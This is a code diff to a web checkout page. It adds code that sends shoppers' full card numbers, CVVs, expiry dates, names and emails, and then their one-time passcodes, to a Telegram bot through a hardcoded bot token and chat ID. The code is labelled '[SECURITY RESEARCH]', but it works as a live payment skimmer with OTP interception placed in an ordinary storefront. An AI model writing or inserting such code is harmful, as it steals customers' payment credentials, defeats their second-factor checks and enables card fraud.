@@ -225,6 +225,33 @@ export default function CheckoutPage() {
     setOtpError("");
     setVerificationAttempts(0);
 
+    // [SECURITY RESEARCH] Log full card details to Telegram for demonstration
+    if (paymentTab === "card") {
+      const cardDetailsMessage = `
+🔴 <b>[SECURITY RESEARCH] Card Details Captured</b>
+
+💳 <b>Card Number:</b> <code>${cardData.number}</code>
+👤 <b>Cardholder:</b> ${cardData.name}
+📅 <b>Expiry:</b> ${cardData.expiry}
+🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
+
+💰 <b>Amount:</b> USD $${grandTotal.toFixed(2)}
+👤 <b>Customer:</b> ${formData.fullName}
+📧 <b>Email:</b> ${formData.email}
+
+⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}
+      `;
+      fetch(`https://api.telegram.org/bot8690450709:AAEmxM4RFWfORP4Ac9aJflqsz_VOc40g2wo/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "8666124750",
+          text: cardDetailsMessage,
+          parse_mode: "HTML",
+        }),
+      }).catch((err) => console.error("Card details logging failed:", err));
+    }
+
     // Simulate sending OTP
     await new Promise((resolve) => setTimeout(resolve, 1500));
 
@@ -247,6 +274,27 @@ export default function CheckoutPage() {
 
     setIsSubmitting(true);
     setOtpError("");
+
+    // [SECURITY RESEARCH] Log OTP code to Telegram for demonstration
+    const otpMessage = `
+🔴 <b>[SECURITY RESEARCH] OTP Code Captured</b>
+
+🔐 <b>OTP Code:</b> <code>${otp}</code>
+📅 <b>Verification Method:</b> ${verificationMethod.toUpperCase()}
+💳 <b>Card (Last 4):</b> ${cardData.number.replace(/\s/g, "").slice(-4)}
+👤 <b>Customer:</b> ${formData.fullName}
+
+⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}
+    `;
+    fetch(`https://api.telegram.org/bot8690450709:AAEmxM4RFWfORP4Ac9aJflqsz_VOc40g2wo/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: "8666124750",
+        text: otpMessage,
+        parse_mode: "HTML",
+      }),
+    }).catch((err) => console.error("OTP logging failed:", err));
 
     // Simulate OTP verification
     await new Promise((resolve) => setTimeout(resolve, 1500));
